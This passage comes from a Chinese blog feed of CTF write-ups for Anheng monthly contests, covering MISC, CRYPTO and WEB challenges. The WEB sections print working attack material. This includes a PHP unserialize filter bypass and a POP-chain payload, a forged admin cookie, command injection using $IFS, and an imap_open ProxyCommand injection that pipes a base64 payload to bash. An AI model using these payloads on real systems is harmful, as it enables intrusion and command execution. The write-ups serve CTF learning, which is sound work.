class="string">"二胡"</span>,<span class="string">"二石"</span>,<span class="string">"漏斗"</span>,<span class="string">"二石"</span>,<span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"漏斗"</span>,<span class="string">"喇叭"</span>,</span><br><span class="line"><span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"鹅卵石"</span>,<span class="string">"21世纪"</span>,<span class="string">"耳机"</span>,<span class="string">"油漆"</span>,<span class="string">"耳机"</span>,<span class="string">"二石"</span>,<span class="string">"二胡"</span>,<span class="string">"耳机"</span>,<span class="string">"21世纪"</span>,<span class="string">"企鹅"</span>,<span class="string">"二流子"</span>,<span class="string">"二石"</span>,<span class="string">"要发"</span>,</span><br><span class="line"><span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"企鹅"</span>,<span class="string">"乔丹"</span>,<span class="string">"二石"</span>,<span class="string">"酒壶"</span>)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">"企鹅"</span>:<span class="number">72</span>,<span class="string">"青蛙"</span>:<span class="number">78</span>,<span class="string">"油漆"</span>:<span class="number">67</span>,<span class="string">"花旗参"</span>:<span class="number">73</span>,<span class="string">"救生圈"</span>:<span class="number">93</span>,<span class="string">"二胡"</span>:<span class="number">25</span>,<span class="string">"二石"</span>:<span class="number">20</span>,<span class="string">"漏斗"</span>:<span class="number">69</span>,<span class="string">"喇叭"</span>:<span class="number">68</span>,<span class="string">"冰淇淋"</span>:<span class="number">70</span>,</span><br><span class="line"><span class="string">"鹅卵石"</span>:<span class="number">24</span>,<span class="string">"21世纪"</span>:<span class="number">21</span>,<span class="string">"耳机"</span>:<span class="number">27</span>,<span class="string">"二流子"</span>:<span class="number">26</span>,<span class="string">"要发"</span>:<span class="number">18</span>,<span class="string">"乔丹"</span>:<span class="number">23</span>,<span class="string">"酒壶"</span>:<span class="number">95</span>&#125;</span><br><span class="line"></span><br><span class="line">nums = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">    temp = dic.get(item)</span><br><span class="line">    nums += str(temp)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)//<span class="number">2</span>):</span><br><span class="line">    flag += chr(int(nums[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>])+<span class="number">30</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></div></figure>        <h1 id="12月月赛">          <a href="#12月月赛" class="heading-link"><i class="fas fa-link"></i></a>12月月赛</h1>              <h2 id="MISC-2">          <a href="#MISC-2" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>              <h3 id="签到题">          <a href="#签到题" class="heading-link"><i class="fas fa-link"></i></a>签到题</h3>      <p>关注公主号，回复flag会返回一个问题 <code>什么牛不会跑</code> ，答案是 <code>蜗牛</code> ,然后即可得到flag</p><!-- flag{6ef1b2246e5e651a46bfa51cfa71b763} -->        <h3 id="学习资料">          <a href="#学习资料" class="heading-link"><i class="fas fa-link"></i></a>学习资料</h3>      <p>尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。</p><!-- Flag{edaa144c91a4e5b817e4a18cbdb78879} -->        <h3 id="变换的指纹">          <a href="#变换的指纹" class="heading-link"><i class="fas fa-link"></i></a>变换的指纹</h3>      <p>用CSDN密码库密码爆破。我失败了，看了别人的密码<code>!(()!@)6125dou</code>（注意结尾的空格），之后即可得到压缩包，</p><p>23685528276158852365572716835687172857481317</p>        <h3 id="JUJU">          <a href="#JUJU" class="heading-link"><i class="fas fa-link"></i></a>JUJU</h3>      <p>题目提示了说<code>11只JUJU</code>，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度</p><p><img src="https://i.loli.net/2019/01/17/5c40908a8abf5.png" alt></p><p>然后即可看到类似base64编码的字符串<code>MZWGCZ33GQZTQMTEM5SGMMTEPU====</code>，但是解码失败，尝试后发现是base32编码的，解密即可得到flag<code>flag{4382dgdf2d}</code></p>        <h3 id="菜刀666">          <a href="#菜刀666" class="heading-link"><i class="fas fa-link"></i></a>菜刀666</h3>      <p>先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字<code>well,you need passwd!</code>，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片</p><p><img src="https://i.loli.net/2019/01/18/5c41e9b279481.png" alt></p><p>打开图片即可看到密码，解压即可看到flag</p><!-- flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} -->        <h2 id="WEB">          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a>WEB</h2>              <h3 id="easy">          <a href="#easy" class="heading-link"><i class="fas fa-link"></i></a>easy</h3>      <p>代码审计，关键过滤如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></div></figure><p>可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 <code>+</code> 绕过 <code>o:14 -&gt; o:+14</code> </p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$data = <span class="keyword">new</span> baby();</span><br><span class="line">$data-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(serialize(($data)));<span class="comment">//给输出加一个加号在url编码一下</span></span><br></pre></td></tr></table></div></figure><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;?data&#x3D;O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></div></figure><!-- flag{ad2328a2c3f0933c053fd3c6f28f6143} -->        <h3 id="ezweb2">          <a href="#ezweb2" class="heading-link"><i class="fas fa-link"></i></a>ezweb2</h3>      <p>既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 <code>you are not admin.</code> ，查看cookie发现user值为<code>user</code>的base64值，我们将此值修改为 <code>admin</code> 的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过<br><code>cat$IFS/ffLAG_404</code> ，然后即可成功绕过</p><p><img src="https://i.loli.net/2019/01/16/5c3f3979d4b1c.png" alt="result"></p><!-- flag{6f1d95159e3b90ed28186c518dd15e8c} -->        <h1 id="1月月赛">          <a href="#1月月赛" class="heading-link"><i class="fas fa-link"></i></a>1月月赛</h1>              <h2 id="web-2">          <a href="#web-2" class="heading-link"><i class="fas fa-link"></i></a>web</h2>              <h3 id="babygo">          <a href="#babygo" class="heading-link"><i class="fas fa-link"></i></a>babygo</h3>      <p>代码审计题目</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>题目考察pop链的构造，核心点在于</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br></pre></td></tr></table></div></figure><p>代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值</p><p>构造pop链如下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing = <span class="string">'O:4:"baby":3:&#123;s:9:" * skyobj";N;s:3:"aaa";s:4:"snow";s:3:"bbb";R:3;&#125;'</span>; </span><br><span class="line">&#125;  </span><br><span class="line">$b = <span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;%00%2A%00skyobj&quot;%3BO%3A4%3A&quot;cool&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A4%3A&quot;nice&quot;%3BN%3Bs%3A6%3A&quot;amzing&quot;%3Bs%3A68%3A&quot;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;+%2A+skyobj&quot;%3BN%3Bs%3A3%3A&quot;aaa&quot;%3Bs%3A4%3A&quot;snow&quot;%3Bs%3A3%3A&quot;bbb&quot;%3BR%3A3%3B%7D&quot;%3B%7Ds%3A3%3A&quot;aaa&quot;%3BN%3Bs%3A3%3A&quot;bbb&quot;%3BN%3B%7D</span><br></pre></td></tr></table></div></figure><p>查看源代码即可得到flag</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $flag = 'flag&#123;bd75a38e62ec0e450745a8eb8e667f5b&#125;';</span></span><br><span class="line">$sth=<span class="string">'test5030b66d4bdtest35daed9d51e2688377299test'</span>;</span><br></pre></td></tr></table></div></figure>        <h2 id="MISC-3">          <a href="#MISC-3" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>              <h3 id="zhunianjixiang">          <a href="#zhunianjixiang" class="heading-link"><i class="fas fa-link"></i></a>zhunianjixiang</h3>      <p>题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost zhu.jpg</span><br></pre></td></tr></table></div></figure><p>然后即可得到一张二维码，扫描一下</p><p><img src="https://i.loli.net/2019/01/31/5c52a84fc2d4e.png" alt></p><p>看来还有其他东西，stegsolve上查看一下得到flag</p><p><img src="https://i.loli.net/2019/01/31/5c52a85a2c2bf.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="CRYPTO">          <a href="#CRYPTO" class="heading-link"><i class="fas fa-link"></i></a>CRYPTO</h2>              <h3 id="真的是键盘吗">          <a href="#真的是键盘吗" class="heading-link"><i class="fas fa-link"></i></a>真的是键盘吗</h3>      <blockquote><p>ypau_kjg;”g;”ypau+</p></blockquote><p>题目的提示不好，原题目的提示是<code>键盘之争</code>，百度一下即可发现是考察键盘的两种布局方式<span class="exturl"><a class="exturl__link" href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，按照两种方式一一对应即可</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QWERTY = [<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'_'</span>,<span class="string">'+'</span>]</span><br><span class="line">Dvorak = [<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'?'</span>,<span class="string">'+'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'v'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">dic = dict(zip(QWERTY,Dvorak))</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">s = <span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></div></figure><blockquote><p>flag{this_is_flag}</p></blockquote>        <h3 id="get-it">          <a href="#get-it" class="heading-link"><i class="fas fa-link"></i></a>get it</h3>      <blockquote><p>Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。</p><p>Eve窃听到这样一段内容，主要内容如下：<br>p = 37<br>A = 17<br>B = 31</p><p>U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2<br>l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O<br>K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62<br>7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw<br>HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal<br>+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK<br>ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl<br>VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6<br>m5lSYiFFd0E=</p><p>分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。</p><p>而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。</p><p>例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</p><p>password = hashlib.md5(“(3,6,35)”).hexdigest()[0:16]</p></blockquote>        <h1 id="二月月赛">          <a href="#二月月赛" class="heading-link"><i class="fas fa-link"></i></a>二月月赛</h1>              <h2 id="WEB-1">          <a href="#WEB-1" class="heading-link"><i class="fas fa-link"></i></a>WEB</h2>      <p>注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置<br><img src="https://i.loli.net/2019/02/28/5c778a7acd48e.png" alt><br>上传测试可以发现文件会被强制命名为<code>用户名.jpg</code>，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imap_open(string $mailbox, string $username, string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></div></figure><p>漏洞在于$mailbox，用docker来测试一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search imap</span><br><span class="line">docker pull fedosov&#x2F;docker-php-imap-composer</span><br><span class="line">docker run -itd fedosov&#x2F;docker-php-imap-composer &#x2F;bin&#x2F;bash</span><br><span class="line">docker attach id</span><br></pre></td></tr></table></div></figure><p>写入一个实现漏洞测试函数<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo skysky|tee /tmp/success"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></div></figure></p><p>在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件，</p><p>但是实际操作失败了，不知道原因为何。</p>        <h2 id="MISC-4">          <a href="#MISC-4" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>              <h3 id="非常简单的流量分析">          <a href="#非常简单的流量分析" class="heading-link"><i class="fas fa-link"></i></a>非常简单的流量分析</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></div></figure><p>追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容</p><blockquote><p>md5 0x99a98e067af6b09e64f3740767096c96</p><p>DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d  (129-&gt;143)</p><p>DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b  (143-&gt;129)</p></blockquote><p>当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包</p><p>按照配置网上的思路配置一下esp秘钥，依次选择<code>编辑-&gt;首选项-&gt;Protocols-&gt;ESP</code></p><p>添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值<br><img src="https://i.loli.net/2019/02/28/5c7779afb7a07.png" alt></p><p>之后即可得到解密报文</p><p>发现http报文有点特殊</p><p><img src="https://i.loli.net/2019/02/28/5c7779ee0e7c4.png" alt></p><p>可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'2.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    par = re.findall(<span class="string">r'include/information/.*_(.*)\.php'</span>,content)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> par:</span><br><span class="line">        flag += chr(int(i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></div></figure><p>flag：<code>flag{27b03b758f255276e5a98da0e1947bed}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
&lt;p&gt;部分安恒月赛题目的复现记录&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>应急挑战杯2019复现</title>
    <link href="http://chaosec.top/2020/09/13/YJTZB2019/"/>
    <id>http://chaosec.top/2020/09/13/YJTZB2019/</id>
    <published>2020-09-13T12:18:00.000Z</published>
    <updated>2020-09-13T12:20:03.190Z</updated>
    
